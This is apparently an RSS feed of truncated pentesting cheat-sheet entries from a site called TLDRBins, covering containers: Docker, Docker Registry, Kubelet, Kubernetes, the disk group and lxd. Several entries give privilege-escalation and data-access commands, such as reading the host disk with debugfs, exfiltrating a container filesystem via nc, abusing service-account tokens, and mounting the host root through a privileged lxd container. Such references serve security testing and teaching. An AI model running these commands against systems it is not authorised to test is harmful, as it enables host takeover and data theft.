channel.title: Container on TLDRBins
channel.description: Recent content in Container on TLDRBins

item.title: disk group
item.description: Basic # Show devices lsblk # Device attributes blkid # Show swap on blk swapon -s # Filesystem info cat /etc/fstab Abuse #1: Read host’s filesystem from container (root) 1. Open target device debugfs /dev/sda1 # Read ls /root Abuse #2: Read container’s filesystem from host 1. Show LVM mappings ls -l /dev/mapper/ 2. Exfil container’s filesystem # In our local machine nc -lvnp <LOCAL_PORT> > dm-0.gz # Target container rootfs, e.

item.title: Docker
item.description: Basic Commands # Show all running processes sudo docker ps -a # Show all images sudo docker images -a # Stop all processes sudo docker stop $(sudo docker ps -a -q) # Remove all processes sudo docker rm -vf $(sudo docker ps -a -q) # Remove all images sudo docker rmi -f $(sudo docker images -aq) # Shell in docker sudo docker exec -it <CONTAINER_NAME> sh # Copy file from host to container sudo docker cp <HOST_FILE_PATH> <CONTAINER_ID>:<CONTAINER_FILE_PATH> # Copy file from container to host sudo docker cp <CONTAINER_ID>:<CONTAINER_FILE_PATH> <HOST_FILE_PATH> # Copy folder from host to container sudo docker cp <HOST_FOLDER_PATH>/.

item.title: Docker Registry
item.description: Docker Registry API # List repos curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/_catalog # List of tags of this repo curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/tags/list # List manifest file for this tag (e.g. latest) curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/manifests/latest # Get a commit of the image curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/blobs/sha256:<BLOB_HASH>' Docker Registry Dump DockerRegistryGrabber # List repos python3 drg.py <TARGET> -A <TOKEN> --list # Dump repo python3 drg.

item.title: Kubelet
item.description: Basic Commands # List all the pods on the node kubeletctl pods -s <TARGET> # List running pods kubeletctl runningpods -s <TARGET> # Exec command kubeletctl exec "/bin/bash" -p <POD_NAME> -c <CONTAINER_NAME> -s <TARGET> Ref: kubeletctl

item.title: Kubernetes
item.description: Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Basic Commands # List all namespaces kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get namespaces # Get user permissions in current namespace kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list # Get user permissions in specific namespace kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> auth can-i --list -n <NAMESPACE> # List all pods kubectl --token <TOKEN> --certificate-authority ca.crt --server <TARGET> get pods --all-namespaces # List pods in specific namespace kubectl --token <TOKEN> --certificate-authority ca.

item.title: lxd
item.description: Basic Commands # Check if user in lxd group id # List containers lxc list # List images lxc image list Abuse #1: Mount host’s file system # Upload a 656 bytes conatiner image echo  | base64 -d > test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.
